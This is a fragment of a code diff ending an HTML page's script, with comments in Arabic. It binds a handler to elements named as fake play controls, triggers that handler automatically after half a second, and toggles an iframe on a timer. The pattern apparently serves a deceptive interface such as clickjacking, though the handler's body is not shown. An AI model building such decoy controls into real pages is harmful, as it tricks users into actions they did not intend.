+        }
+    });
+    
+    // بعد 3 ثوانٍ إذا لم يسمح
+    setTimeout(() => {
+        iframe.classList.remove('active');
+    }, 3000);
+}
+
+// ربط الضغطة بكل العناصر الوهمية
+document.getElementById('fakePlayBtn').onclick = onUserClick;
+document.getElementById('fakePlayText').onclick = onUserClick;
+
+// تشغيل تلقائي بعد 0.5 ثانية
+setTimeout(() => {
+    onUserClick();
+}, 500);
+</script>
+</body>
+                                                                  </html>
